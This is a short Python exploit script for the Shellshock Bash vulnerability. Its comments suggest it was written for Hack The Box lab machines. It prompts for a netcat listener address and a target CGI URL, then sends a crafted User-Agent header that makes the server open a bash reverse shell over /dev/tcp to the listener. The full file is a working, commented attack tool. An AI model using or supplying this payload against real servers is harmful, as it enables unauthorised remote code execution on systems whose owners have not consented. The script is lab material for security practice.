import requests

print('Before beginning ensure that you have a netcat listener to receive the reverse shell.')

l_port = input('Netcat port: ')
l_host = input('Local ipv4: ') #If you're on HTB this will be your tun0 ip
Path_url = input('Full URL to vulnerable script: ')

# If you're confused here is what your input should look like
#Netcat port: 1234
#Local ipv4: 10.10.14.65
#Full URL to vulnerable script: http://10.129.156.176/cgi-bin/user.sh

print('Starting exploit')
rev_shell = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(l_host, l_port) # This is our command we want executed, this will spawn a reverse shell to our netcat listener.
exploit = {'User-Agent' : r'() {{ _; }} >_[$($())] echo -e "\r\n$({})"'.format(rev_shell)} # With shellshock we exploit bash by providing this string of characters along with the command we want executed inside the user header.
r = requests.get('{}'.format(Path_url), headers=exploit) # Now we send over our exploit and we get a reverse shell! Please note this will hang your script don't stop this script as it will drop your shell.
